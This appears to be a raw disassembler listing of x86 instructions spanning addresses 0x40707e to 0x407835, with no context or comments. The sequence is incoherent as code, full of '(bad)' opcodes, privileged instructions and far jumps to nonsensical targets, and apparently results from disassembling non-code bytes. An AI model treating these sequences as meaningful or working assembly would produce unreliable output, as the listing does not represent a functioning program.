  40707e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40707f:	into   
  407080:	sub    eax,0x415777a5
  407085:	xor    DWORD PTR [ebx+0x4e],eax
  407088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407089:	in     eax,0xcb
  40708b:	lahf   
  40708c:	pop    ecx
  40708d:	mov    WORD PTR [eax],ds
  40708f:	pop    edx
  407090:	sub    al,0xf2
  407092:	inc    ebx
  407093:	repnz in eax,dx
  407095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407096:	jns    0x4070b7
  407098:	sub    al,0xfe
  40709a:	out    dx,al
  40709b:	stc    
  40709c:	or     al,0xaf
  40709e:	mov    bl,0x25
  4070a0:	scas   eax,DWORD PTR es:[edi]
  4070a1:	xchg   DWORD PTR [esi+0x82aaf8d],ebp
  4070a7:	popf   
  4070a8:	pop    es
  4070a9:	jecxz  0x407125
  4070ab:	cdq    
  4070ac:	sub    ebp,DWORD PTR [eax]
  4070ae:	inc    esp
  4070af:	xor    BYTE PTR [eax-0x4f],dh
  4070b2:	push   esp
  4070b3:	stos   DWORD PTR es:[edi],eax
  4070b4:	es push eax
  4070b6:	mov    edi,DWORD PTR [esp+esi*2]
  4070b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070ba:	inc    ebx
  4070bb:	adc    al,0xaa
  4070bd:	lock cli 
  4070bf:	jae    0x4070ab
  4070c1:	out    dx,eax
  4070c2:	ja     0x40704d
  4070c4:	scas   al,BYTE PTR es:[edi]
  4070c5:	xchg   ebx,edx
  4070c7:	(bad)  
  4070c8:	push   edx
  4070c9:	inc    esp
  4070ca:	rcr    BYTE PTR [eax],0x4e
  4070cd:	xor    edi,esp
  4070cf:	(bad)  
  4070d0:	cmp    eax,0x87fc5cd4
  4070d5:	mov    edi,0x45662a2f
  4070da:	and    ah,bh
  4070dc:	idiv   BYTE PTR [ebx-0x2f]
  4070df:	push   ebp
  4070e0:	xor    DWORD PTR [esi-0x74],eax
  4070e3:	lock es data16 mov al,0x41
  4070e8:	repz mov bl,0xb3
  4070eb:	jne    0x407137
  4070ed:	add    bl,BYTE PTR [ebx+0x42b05a34]
  4070f3:	mov    bl,0x79
  4070f5:	dec    ecx
  4070f6:	retf   
  4070f7:	in     eax,dx
  4070f8:	add    ebx,DWORD PTR [edx+0x7daffa5a]
  4070fe:	sub    al,0x31
  407100:	jmp    0x891d7322
  407105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407106:	hlt    
  407107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407108:	shl    ecx,1
  40710a:	cli    
  40710b:	hlt    
  40710c:	ins    BYTE PTR es:[edi],dx
  40710d:	push   0xffffff9d
  40710f:	push   cs
  407110:	psllw  mm5,QWORD PTR [edx-0x13]
  407114:	int3   
  407115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407116:	and    eax,0x5b30885e
  40711b:	sub    esi,0xffffff98
  40711e:	cmp    DWORD PTR [ecx+0x728200b8],esp
  407124:	out    0xa9,al
  407126:	retf   0x6b08
  407129:	sbb    BYTE PTR [ebp+0x13e63646],dh
  40712f:	leave  
  407130:	mov    WORD PTR [ecx],ds
  407132:	sti    
  407133:	out    0xa8,al
  407135:	sub    eax,DWORD PTR [esi+eax*8-0x6c74fed2]
  40713c:	fidivr DWORD PTR [eax+0x3661fd7d]
  407142:	or     dh,BYTE PTR [esi-0x4b]
  407145:	pop    ss
  407146:	mov    eax,0x40169724
  40714b:	and    BYTE PTR [ebx+eiz*1+0x44],al
  40714f:	cwde   
  407150:	repz mov dh,0x58
  407153:	and    BYTE PTR [ebx+ebx*8],ch
  407156:	jmp    0x407155
  407158:	push   ebx
  407159:	stos   DWORD PTR es:[edi],eax
  40715a:	xchg   DWORD PTR [ebx+0x24f1cda6],ebp
  407160:	and    BYTE PTR [ebp+edx*2+0x48],0x84
  407165:	inc    esi
  407166:	jae    0x4070ef
  407168:	bound  ebp,QWORD PTR [edx+0x5bf2ca54]
  40716e:	mov    ecx,edi
  407170:	fistp  DWORD PTR [edx]
  407172:	xlat   BYTE PTR ds:[ebx]
  407173:	pop    edi
  407174:	ja     0x4071ee
  407176:	icebp  
  407177:	dec    esi
  407178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407179:	xchg   ebx,eax
  40717a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40717b:	stc    
  40717c:	inc    ebx
  40717d:	fdiv   QWORD PTR [ecx]
  40717f:	or     dh,dh
  407181:	sub    esp,ecx
  407183:	mov    WORD PTR [edx],gs
  407185:	scas   al,BYTE PTR es:[edi]
  407186:	mov    ds:0x3a23771e,eax
  40718b:	lsl    ebp,dx
  40718e:	xor    eax,0x774b5a67
  407193:	jg     0x40717d
  407195:	xchg   edx,eax
  407196:	adc    DWORD PTR [ebx-0x4d2b093],ebp
  40719c:	mov    ah,0x41
  40719e:	adc    ah,bl
  4071a0:	mov    al,0x6e
  4071a2:	adc    eax,0xce99f939
  4071a7:	imul   esp,DWORD PTR [ebp+0xf],0x420586cc
  4071ae:	stos   BYTE PTR es:[edi],al
  4071af:	mov    ah,0x9
  4071b1:	es addr16 mov dh,0x2d
  4071b5:	inc    edi
  4071b6:	dec    edx
  4071b7:	pop    ebp
  4071b8:	or     al,0x45
  4071ba:	sbb    eax,0xc20a60dc
  4071bf:	push   ecx
  4071c0:	pop    es
  4071c1:	push   esi
  4071c2:	pop    esp
  4071c3:	sub    eax,0x6700984f
  4071c8:	and    al,0x3d
  4071ca:	or     DWORD PTR [eax+0x7b],ecx
  4071cd:	aas    
  4071ce:	(bad)  
  4071cf:	push   ebp
  4071d0:	iret   
  4071d1:	inc    ebx
  4071d2:	jmp    0x407221
  4071d4:	push   ebp
  4071d5:	cmp    ch,dh
  4071d7:	xor    edx,ebp
  4071d9:	jg     0x407210
  4071db:	mov    ecx,0x5527f0f1
  4071e0:	xchg   ebp,eax
  4071e1:	or     cl,dh
  4071e3:	xor    ebx,esi
  4071e5:	aam    0xc4
  4071e7:	push   esp
  4071e8:	in     al,dx
  4071e9:	in     eax,0x69
  4071eb:	push   esi
  4071ec:	xor    eax,0x1045e5da
  4071f1:	push   ebp
  4071f2:	cmpxchg DWORD PTR [eax],edi
  4071f5:	mov    bh,0x26
  4071f7:	(bad)  
  4071f8:	sub    eax,0xf239e964
  4071fd:	push   ebp
  4071fe:	out    0xd4,al
  407200:	pop    es
  407201:	aad    0xd0
  407203:	mov    esp,0x2923e6ae
  407208:	mov    bh,dl
  40720a:	xchg   ebx,eax
  40720b:	div    ebp
  40720d:	sub    BYTE PTR ss:[esi],bh
  407210:	push   ss
  407211:	shl    DWORD PTR [ecx-0x59bd1375],1
  407217:	in     al,0x41
  407219:	push   ss
  40721a:	out    dx,eax
  40721b:	xor    edx,DWORD PTR [eax-0x79757dea]
  407221:	aam    0xac
  407223:	or     bl,dl
  407225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407226:	repnz or al,0xa0
  407229:	sbb    eax,0x93fb6e76
  40722e:	hlt    
  40722f:	jne    0x4072a0
  407231:	loopne 0x40724d
  407233:	fsub   st(7),st
  407235:	dec    ecx
  407236:	or     ah,BYTE PTR [ebp-0x418e5c50]
  40723c:	and    ebp,DWORD PTR [ecx]
  40723e:	mov    esp,ebx
  407240:	repnz and al,0x17
  407243:	dec    ecx
  407244:	xor    ah,BYTE PTR [ebx]
  407246:	adc    bl,BYTE PTR [esi+0xd]
  407249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40724a:	mov    esp,0x319c2744
  40724f:	pop    ebx
  407250:	cmc    
  407251:	push   ds
  407252:	ins    BYTE PTR es:[edi],dx
  407253:	pop    ecx
  407254:	js     0x4072c2
  407256:	(bad)  
  407257:	jmp    0xd567cf33
  40725c:	sar    BYTE PTR [eax+0x26],0xfe
  407260:	out    dx,eax
  407261:	mov    al,ds:0x590a0678
  407266:	frstor [edi-0xd40bb3a]
  40726c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40726d:	push   ebx
  40726e:	hlt    
  40726f:	lock pop ds
  407271:	ret    
  407272:	int3   
  407273:	xor    BYTE PTR [eax],dl
  407275:	int    0xac
  407277:	fisub  DWORD PTR [edi+ebp*4]
  40727a:	and    al,0x40
  40727c:	sub    BYTE PTR [ebx+0x226552af],bl
  407282:	push   0xdcb016a8
  407287:	or     dl,dl
  407289:	adc    bl,al
  40728b:	and    dh,ch
  40728d:	ret    0xe219
  407290:	push   ds
  407291:	sub    eax,0xfb1ecfba
  407296:	and    DWORD PTR [ecx-0x5c],esp
  407299:	ja     0x4072ed
  40729b:	dec    esi
  40729c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40729d:	(bad)  
  40729f:	and    ah,BYTE PTR [eax+0x3b8a38e8]
  4072a5:	popa   
  4072a6:	das    
  4072a7:	jmp    0x7a90:0x41eaaa7e
  4072ae:	mov    es,WORD PTR [edi-0x485e23d7]
  4072b4:	ja     0x407313
  4072b6:	xchg   ebx,eax
  4072b7:	push   cs
  4072b8:	sbb    BYTE PTR [ecx+0x6b10ea04],al
  4072be:	ds push ds
  4072c0:	xor    ecx,eax
  4072c2:	push   edx
  4072c3:	mov    al,ds:0x3e96ab96
  4072c8:	adc    DWORD PTR [edx+0x227de2e2],eax
  4072ce:	int    0x4e
  4072d0:	lock jmp 0x1cc0:0x5a991da5
  4072d8:	push   esi
  4072d9:	call   0xabda:0x19a2ee0c
  4072e0:	jmp    0xc172:0x98584144
  4072e7:	adc    edx,DWORD PTR [edi+0x73]
  4072ea:	adc    eax,edi
  4072ec:	scas   al,BYTE PTR es:[edi]
  4072ed:	sbb    eax,0x14c5bdbd
  4072f2:	mov    dl,0x7c
  4072f4:	adc    dh,BYTE PTR [ebx]
  4072f6:	fadd   DWORD PTR [ebx+0x2a1004c7]
  4072fc:	repz gs jmp 0x407363
  407300:	inc    esi
  407301:	pop    ss
  407302:	std    
  407303:	cmp    eax,0x12fb4d48
  407308:	cmp    ah,BYTE PTR [esi+0x84153b3]
  40730e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40730f:	popa   
  407310:	pop    edi
  407311:	retf   
  407312:	rcl    BYTE PTR [ebx],cl
  407314:	in     al,dx
  407315:	push   cs
  407316:	add    DWORD PTR [esp+edx*8],ebx
  407319:	jb     0x407335
  40731b:	push   cs
  40731c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40731d:	js     0x40733a
  40731f:	int    0x98
  407321:	mov    bl,0xad
  407323:	xor    esi,DWORD PTR [edx-0x329314c5]
  407329:	pop    es
  40732a:	aaa    
  40732b:	sub    eax,0xaaaa9ebe
  407330:	jmp    0x7f8d160e
  407335:	out    0x3b,eax
  407337:	mov    ?,ebx
  407339:	out    dx,eax
  40733a:	cmp    edi,eax
  40733c:	popf   
  40733d:	push   ss
  40733e:	ss shl ah,0x1e
  407342:	int3   
  407343:	ret    
  407344:	dec    ebp
  407345:	mov    ebp,0x58b22fed
  40734a:	gs aaa 
  40734c:	dec    edi
  40734d:	fsubr  QWORD PTR [esi]
  40734f:	test   DWORD PTR [eax+ebp*2+0x2a],ebx
  407353:	xor    dh,BYTE PTR [esi+esi*4+0x7c]
  407357:	(bad)  [edx+0x4024dbed]
  40735d:	mov    ds:0xc95eceae,al
  407362:	gs push ecx
  407364:	push   ebx
  407365:	jp     0x4073de
  407367:	add    eax,0x92248477
  40736c:	fwait
  40736d:	cwde   
  40736e:	dec    edi
  40736f:	test   DWORD PTR [edx+0x751583eb],esi
  407375:	mov    WORD PTR [edi],ss
  407377:	dec    esp
  407378:	cmp    edi,DWORD PTR [esi+0x67]
  40737b:	pop    esp
  40737c:	or     eax,0x544bc935
  407381:	icebp  
  407382:	daa    
  407383:	stos   DWORD PTR es:[edi],eax
  407384:	inc    ebx
  407385:	lock fcmovnb st,st(3)
  407388:	xor    edi,ebp
  40738a:	(bad)  
  40738b:	jo     0x407311
  40738d:	adc    DWORD PTR [edi-0x75],ebx
  407390:	imul   edi,DWORD PTR [ebp+0x51852c36],0x22879e41
  40739a:	ds dec esp
  40739c:	mov    DWORD PTR [eax],edx
  40739e:	sub    eax,0xf7615e08
  4073a3:	stos   DWORD PTR es:[edi],eax
  4073a4:	push   ecx
  4073a5:	mov    BYTE PTR [esp+ebp*8-0x44891719],ah
  4073ac:	test   DWORD PTR [ebp-0x7402c7c],esi
  4073b2:	bound  esp,QWORD PTR [ecx-0x6b]
  4073b5:	push   0x7b8f9dc9
  4073ba:	push   edx
  4073bb:	pop    ebp
  4073bc:	pop    es
  4073bd:	jmp    0x8080ee10
  4073c2:	pop    ss
  4073c3:	jno    0x40735c
  4073c5:	stc    
  4073c6:	jo     0x40734c
  4073c8:	out    dx,al
  4073c9:	nop
  4073ca:	pop    ecx
  4073cb:	pop    ss
  4073cc:	call   0x4d07:0xe046ea6b
  4073d3:	sbb    eax,0x492b730a
  4073d8:	push   0xffffff88
  4073da:	cmp    eax,0xd73dd5c5
  4073df:	sbb    al,0x2f
  4073e1:	jns    0x407395
  4073e3:	jg     0x407406
  4073e5:	adc    ch,BYTE PTR [eax+0x2afefe94]
  4073eb:	jo     0x4073f1
  4073ed:	pushf  
  4073ee:	int    0x69
  4073f0:	out    dx,al
  4073f1:	mov    ebp,0xaadd856e
  4073f6:	pusha  
  4073f7:	(bad)  
  4073f9:	mov    edx,0x1192d519
  4073fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073ff:	sbb    ah,BYTE PTR [eax+edi*4]
  407402:	imul   ecx,DWORD PTR [eax],0x5dcf05fa
  407408:	mov    esi,DWORD PTR [edx-0x5d]
  40740b:	and    al,0xad
  40740d:	mov    cl,0xdd
  40740f:	ins    BYTE PTR es:[edi],dx
  407410:	jnp    0x407402
  407412:	fdiv   DWORD PTR [eax-0x102d7060]
  407418:	xchg   ecx,eax
  407419:	mov    al,0x9
  40741b:	sbb    DWORD PTR [ebp+0x50],ebx
  40741e:	jecxz  0x407453
  407420:	pushf  
  407421:	sti    
  407422:	or     al,0x5c
  407424:	cmp    dh,ah
  407426:	cmp    eax,0x37042acd
  40742b:	clc    
  40742c:	pop    edx
  40742d:	js     0x407445
  40742f:	pop    ss
  407430:	pop    esi
  407431:	mov    dh,0x37
  407433:	sbb    BYTE PTR [edx],0x1b
  407436:	jmp    0xfa2a:0x71a86e27
  40743d:	fs push 0xf770e2d1
  407443:	xor    ecx,ebx
  407445:	loop   0x407408
  407447:	stc    
  407448:	push   ds
  407449:	sub    BYTE PTR [edx],cl
  40744b:	int    0x53
  40744d:	cmc    
  40744e:	mov    eax,esi
  407450:	jae    0x40741c
  407452:	popa   
  407453:	cmp    ch,BYTE PTR [edx+0x1c]
  407456:	(bad)  
  407457:	fs das 
  407459:	daa    
  40745a:	aad    0xb0
  40745c:	mov    ds:0x4da4fa75,al
  407461:	int    0x99
  407463:	ret    0xa9f5
  407466:	imul   esi,DWORD PTR [eax+0xe],0xffffffef
  40746a:	push   ss
  40746b:	mov    bl,0xbe
  40746d:	adc    DWORD PTR [edx],ebp
  40746f:	dec    esi
  407470:	add    al,0x47
  407472:	(bad)  
  407474:	retf   0x1b7d
  407477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407478:	call   DWORD PTR [ecx+0x496e5924]
  40747e:	mov    eax,0xabbcd453
  407483:	dec    edi
  407484:	or     al,0xfe
  407486:	mov    ebp,0x61d28f43
  40748b:	loopne 0x40741f
  40748d:	in     eax,dx
  40748e:	rol    BYTE PTR [edi],cl
  407490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407491:	jne    0x40744c
  407493:	inc    ebp
  407494:	pop    eax
  407495:	in     al,0x18
  407497:	xchg   DWORD PTR [edx-0x1b],edx
  40749a:	mov    esi,DWORD PTR [ecx-0x6d835d95]
  4074a0:	fs jmp 0xc78f02bd
  4074a6:	and    al,BYTE PTR [esi-0x59]
  4074a9:	fnsave [eax]
  4074ab:	(bad)  
  4074ac:	nop
  4074ad:	inc    ebp
  4074ae:	jno    0x407488
  4074b0:	push   ss
  4074b1:	fmul   QWORD PTR [edi]
  4074b3:	in     eax,0x89
  4074b5:	aas    
  4074b6:	xchg   edx,eax
  4074b7:	sbb    DWORD PTR [edx+eax*4],eax
  4074ba:	pop    ebx
  4074bb:	push   0x104b50c1
  4074c0:	cmp    BYTE PTR [esi-0x3f],ah
  4074c3:	mov    al,0x9d
  4074c5:	dec    esp
  4074c6:	xchg   ecx,eax
  4074c7:	aaa    
  4074c8:	and    al,BYTE PTR [ebx]
  4074ca:	xchg   edi,eax
  4074cb:	jne    0x407484
  4074cd:	sar    al,0x5d
  4074d0:	or     ebp,DWORD PTR [eax+0x73]
  4074d3:	inc    esi
  4074d4:	fsub   DWORD PTR [edi]
  4074d6:	repnz push ss
  4074d8:	inc    ebp
  4074d9:	or     edx,DWORD PTR [eax+0x2]
  4074dc:	nop
  4074dd:	mov    ebx,0xd6b1159c
  4074e2:	mov    eax,ds:0x6e9dd70f
  4074e7:	mov    ah,0x99
  4074e9:	into   
  4074ea:	xor    DWORD PTR [edi],esi
  4074ec:	enter  0x6c57,0x28
  4074f0:	inc    eax
  4074f1:	or     cl,BYTE PTR [edi+0x28]
  4074f4:	aas    
  4074f5:	mov    eax,ds:0x760d042f
  4074fa:	adc    al,0x57
  4074fc:	cmp    bl,BYTE PTR [esi+0x915fc51]
  407502:	enter  0x1f8a,0x79
  407506:	scas   al,BYTE PTR es:[edi]
  407507:	aad    0x52
  407509:	cwde   
  40750a:	mov    ch,0xe2
  40750c:	lea    ebx,[ecx+0x76]
  40750f:	mov    BYTE PTR [ebx+0x4ad3b8af],dh
  407515:	loopne 0x4074f3
  407517:	mov    dh,0x26
  407519:	pop    es
  40751a:	push   ds
  40751b:	cmc    
  40751c:	push   ebp
  40751d:	jle    0x407541
  40751f:	loop   0x407583
  407521:	jo     0x407574
  407523:	popf   
  407524:	es sub ch,cl
  407527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407528:	push   ds
  407529:	xor    ah,BYTE PTR [esi]
  40752b:	sbb    ebp,DWORD PTR [edi-0x35]
  40752e:	add    ch,bh
  407530:	adc    al,0x55
  407532:	jmp    0x40759e
  407534:	inc    esi
  407535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407536:	test   al,0xdd
  407538:	push   esi
  407539:	inc    esi
  40753a:	add    ch,bl
  40753c:	mov    eax,es:0x3f2fd52c
  407542:	popf   
  407543:	mov    dl,0xe9
  407545:	push   0xffffff87
  407547:	stc    
  407548:	mov    ah,dl
  40754a:	mov    al,0xbd
  40754c:	outs   dx,DWORD PTR ds:[esi]
  40754d:	inc    esi
  40754e:	out    0xf5,al
  407550:	cmp    al,0xf3
  407552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407553:	mov    dl,0x82
  407555:	xlat   BYTE PTR ds:[ebx]
  407556:	call   0x706d:0xa5427931
  40755d:	cmp    DWORD PTR [esi-0x3808712],ecx
  407563:	fiadd  WORD PTR [edi-0x60]
  407566:	or     eax,0xa3b28d44
  40756b:	xor    BYTE PTR [edi+0x7fcae882],bh
  407571:	fwait
  407572:	mov    ds:0x326f4af7,eax
  407577:	cwde   
  407578:	shl    BYTE PTR ds:0x33a21e1c,1
  40757e:	mov    esp,0x3b85cc20
  407583:	sbb    ebp,DWORD PTR [esi-0x2d]
  407586:	push   ebp
  407587:	pusha  
  407588:	ja     0x4075df
  40758a:	test   eax,0x5d91b83a
  40758f:	push   eax
  407590:	ret    
  407591:	sbb    BYTE PTR [edx+0x3a],cl
  407594:	jle    0x407576
  407596:	or     al,0x7e
  407598:	adc    al,0xca
  40759a:	adc    edi,DWORD PTR [eax-0xb43ee]
  4075a0:	pop    ds
  4075a1:	xor    bl,BYTE PTR [edx-0x2b210d36]
  4075a7:	xchg   ecx,eax
  4075a8:	sbb    cl,BYTE PTR [ecx+esi*2+0x3c3a73b3]
  4075af:	repnz sub eax,DWORD PTR [esi]
  4075b2:	adc    BYTE PTR [eax+0x54],0xae
  4075b6:	push   ecx
  4075b7:	dec    ecx
  4075b8:	add    DWORD PTR [ecx],edx
  4075ba:	sub    esi,DWORD PTR [edx+0x51]
  4075bd:	xor    DWORD PTR [eax+0x3c],edi
  4075c0:	stos   DWORD PTR es:[edi],eax
  4075c1:	sub    al,0x31
  4075c3:	pop    ecx
  4075c4:	test   DWORD PTR [esi+0x20],edi
  4075c7:	mov    ebp,0x901139d7
  4075cc:	in     al,0xa0
  4075ce:	mov    eax,ecx
  4075d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075d1:	dec    ebx
  4075d2:	(bad)
  4075d6:	pushf  
  4075d7:	xor    edx,DWORD PTR [ebx+0x4c612364]
  4075dd:	xchg   edx,eax
  4075de:	out    0x3c,eax
  4075e0:	ret    0x23cb
  4075e3:	dec    ebx
  4075e4:	push   ebx
  4075e5:	xor    dl,dh
  4075e7:	addr16 inc edx
  4075e9:	test   eax,0x4513a1b2
  4075ee:	or     BYTE PTR [eax+0x1f832aa7],bl
  4075f4:	push   esi
  4075f5:	xchg   BYTE PTR ds:0x1dbcf6ee,cl
  4075fb:	cmc    
  4075fc:	xor    dh,BYTE PTR ds:[si+0x22fc]
  407602:	repnz push eax
  407604:	xor    dl,bh
  407606:	inc    esi
  407607:	xor    BYTE PTR [ebp-0x58],al
  40760a:	pop    ss
  40760b:	outs   dx,DWORD PTR ds:[esi]
  40760c:	dec    ebx
  40760d:	inc    esi
  40760e:	adc    BYTE PTR [edx+0x1b1063d2],dh
  407614:	cli    
  407615:	call   0xdd52:0x8b9b6fbc
  40761c:	xor    al,0x2c
  40761e:	dec    esp
  40761f:	push   eax
  407620:	loope  0x4075ae
  407622:	add    al,al
  407624:	(bad)  [esi+0x7fdf4847]
  40762a:	enter  0x894,0xd5
  40762e:	mov    ebp,0xfeb8199c
  407633:	mov    ebp,DWORD PTR [esi+0x3e]
  407636:	not    BYTE PTR [esi+ecx*4]
  407639:	bnd call 0xfd8dede
  40763f:	imul   esp,DWORD PTR [ebx-0x26],0x6b
  407643:	(bad)  
  407644:	jbe    0x40760f
  407646:	mul    DWORD PTR [ebp+0x44]
  407649:	aas    
  40764a:	test   DWORD PTR [ebp-0x1c0c7af5],esp
  407650:	or     al,0xfc
  407652:	mov    ebp,0x7cfbda41
  407657:	dec    edx
  407658:	sbb    al,0x20
  40765a:	or     ecx,ebx
  40765c:	fstp   TBYTE PTR [esi+0x53]
  40765f:	stos   DWORD PTR es:[edi],eax
  407660:	inc    edx
  407661:	daa    
  407662:	pusha  
  407663:	jge    0x407692
  407665:	aaa    
  407666:	pop    ds
  407667:	call   0x5b436e16
  40766c:	mov    ebx,0xed66e1a
  407671:	pop    esi
  407672:	repz inc edx
  407674:	lock jge 0x407671
  407677:	push   esp
  407678:	lods   al,BYTE PTR ds:[esi]
  407679:	sbb    al,BYTE PTR [ebx]
  40767b:	test   DWORD PTR [edi+0x7b45096e],eax
  407681:	sbb    cl,0x5b
  407684:	arpl   WORD PTR [edi+0x34d8368],si
  40768a:	popf   
  40768b:	inc    ebx
  40768c:	or     BYTE PTR [ebx+0x2b],al
  40768f:	fucomi st,st(0)
  407691:	sub    BYTE PTR [ebx],ah
  407693:	enter  0x1eb1,0x4a
  407697:	fistp  DWORD PTR [edi]
  407699:	(bad)  
  40769b:	in     al,dx
  40769c:	mov    al,ds:0x53ae0a43
  4076a1:	and    al,BYTE PTR [esi-0x39]
  4076a4:	or     edi,esp
  4076a6:	inc    edi
  4076a7:	pop    ds
  4076a8:	push   edi
  4076a9:	shr    BYTE PTR [edx],0x52
  4076ac:	adc    DWORD PTR [edx-0x1a1fd831],edx
  4076b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076b3:	popa   
  4076b4:	mov    al,ds:0x8cd89931
  4076b9:	mov    ebp,0xa250d7a2
  4076be:	lds    esp,FWORD PTR [ebp-0x55]
  4076c1:	daa    
  4076c2:	(bad)  
  4076c3:	and    DWORD PTR ds:0x6ea0b9bd,esp
  4076c9:	bnd fs jae 0x407714
  4076cd:	cld    
  4076ce:	loopne 0x4076c5
  4076d0:	pop    ebp
  4076d1:	mov    al,0x2c
  4076d3:	stos   DWORD PTR es:[edi],eax
  4076d4:	xor    eax,0x655767bd
  4076d9:	mov    edx,0x9f7b9887
  4076de:	jb     0x407711
  4076e0:	iret   
  4076e1:	sub    DWORD PTR [ecx+edx*4],ebp
  4076e4:	mov    ?,WORD PTR [edx+0x171cf2bb]
  4076ea:	cld    
  4076eb:	pop    ebx
  4076ec:	mov    ch,0xe1
  4076ee:	xchg   edi,eax
  4076ef:	inc    esi
  4076f0:	(bad)
  4076f3:	sub    dh,ah
  4076f5:	popa   
  4076f6:	call   0xf9d001c
  4076fb:	cmp    BYTE PTR [ecx-0x47acf362],dl
  407701:	ja     0x4076da
  407703:	inc    ebx
  407704:	push   esp
  407705:	ins    DWORD PTR es:[edi],dx
  407706:	shl    bh,0xa1
  407709:	mul    DWORD PTR [ebx+0x10]
  40770c:	and    ebx,DWORD PTR [ebx]
  40770e:	xor    cl,BYTE PTR [edi+0x5a]
  407711:	mov    edx,0xb003c470
  407716:	les    ecx,FWORD PTR [edx+esi*8]
  407719:	lods   eax,DWORD PTR ds:[esi]
  40771a:	jg     0x40771a
  40771c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40771d:	sub    DWORD PTR [edi-0x61d27eec],edi
  407723:	fcom   QWORD PTR [ebx-0x19]
  407726:	aam    0xa2
  407728:	int    0x1a
  40772a:	sar    al,cl
  40772c:	fdiv   st,st(2)
  40772e:	mov    ds:0x2b7491a,eax
  407733:	arpl   bp,cx
  407735:	push   edi
  407736:	fld    TBYTE PTR es:[edx-0x756bdd52]
  40773d:	inc    esp
  40773e:	mov    eax,0xd3cf335e
  407743:	inc    ecx
  407744:	loop   0x40777c
  407746:	addr16 dec edx
  407748:	pusha  
  407749:	jmp    0x407768
  40774b:	xor    al,0x5b
  40774d:	loop   0x4077ac
  40774f:	ins    BYTE PTR es:[edi],dx
  407750:	loopne 0x407743
  407752:	xlat   BYTE PTR ds:[ebx]
  407753:	scas   eax,DWORD PTR es:[edi]
  407754:	loop   0x407791
  407756:	jns    0x40773f
  407758:	and    DWORD PTR [eax+0x68ea4dd1],esi
  40775e:	pop    ecx
  40775f:	enter  0x5c53,0xa6
  407763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407764:	jl     0x40778f
  407766:	mov    DWORD PTR [ebx-0x28],ebx
  407769:	xor    ecx,DWORD PTR [ebx]
  40776b:	and    DWORD PTR [edx-0x7c52cc07],edx
  407771:	repz call FWORD PTR [edi]
  407774:	(bad)  
  407775:	sbb    esi,DWORD PTR [esi*1+0x1e744ad2]
  40777c:	sub    BYTE PTR [esi+0x4d],dh
  40777f:	pop    edx
  407780:	xor    edx,edi
  407782:	fnstenv es:[ebx+0x78]
  407786:	bound  eax,QWORD PTR [ebp+0x7a]
  407789:	sbb    BYTE PTR [esi-0x76],bl
  40778c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40778d:	retf   0x9024
  407790:	aad    0x9
  407792:	mov    bh,0x8e
  407794:	jne    0x40779c
  407796:	imul   esi,DWORD PTR [ebx],0xf65cea6f
  40779c:	or     al,0xa3
  40779e:	fsubr  DWORD PTR [edx]
  4077a0:	xor    al,BYTE PTR [ebx]
  4077a2:	inc    ebx
  4077a3:	push   ecx
  4077a4:	mov    DWORD PTR [edi],ebx
  4077a6:	dec    eax
  4077a7:	xor    esp,DWORD PTR [edx+ecx*4+0x6d]
  4077ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077ac:	push   esi
  4077ad:	mov    edi,0xb29f6917
  4077b2:	cmp    al,0xfb
  4077b4:	fdivr  st(1),st
  4077b6:	(bad)  
  4077b7:	jp     0x407789
  4077b9:	inc    ebp
  4077ba:	xchg   esi,eax
  4077bc:	imul   edx,DWORD PTR [eax+0x57],0xf8b141ff
  4077c3:	scas   al,BYTE PTR es:[edi]
  4077c4:	ret    0x804d
  4077c7:	ror    BYTE PTR [ebx-0x3c4de097],cl
  4077cd:	daa    
  4077ce:	es xchg ebx,eax
  4077d0:	push   ds
  4077d1:	cmp    DWORD PTR [ebp+0x21],esp
  4077d4:	inc    esi
  4077d5:	mov    dh,BYTE PTR [edx-0x11c92c24]
  4077db:	sub    BYTE PTR [ecx],dl
  4077dd:	js     0x4077a7
  4077df:	mov    dl,0xe3
  4077e1:	pop    ebp
  4077e2:	test   ah,0x8a
  4077e5:	js     0x40777f
  4077e7:	jmp    0xdc62:0x6e3ddada
  4077ee:	mov    al,ds:0xfd44e60a
  4077f3:	or     DWORD PTR ds:0x5d95adcc,0xffffffa3
  4077fa:	fld    TBYTE PTR [edi]
  4077fc:	test   al,0x78
  4077fe:	pop    ebx
  4077ff:	or     ah,bh
  407801:	or     ebp,ecx
  407803:	gs mov ebx,0x1d722199
  407809:	mul    DWORD PTR [edx+0x45fb03be]
  40780f:	sub    al,BYTE PTR [ebx+ebx*4-0x4273ab78]
  407816:	imul   eax,DWORD PTR [ebx],0x85fedf
  40781c:	jae    0x407850
  40781e:	dec    esi
  40781f:	or     edx,DWORD PTR [ebp+0x2f]
  407822:	pop    edi
  407824:	mov    dh,0xa
  407826:	arpl   WORD PTR [edi],ax
  407828:	fbld   TBYTE PTR [esp+edi*1-0x38d98f7c]
  40782f:	and    al,BYTE PTR [ebp-0x98d6e2d]
  407835:	dec    ebx
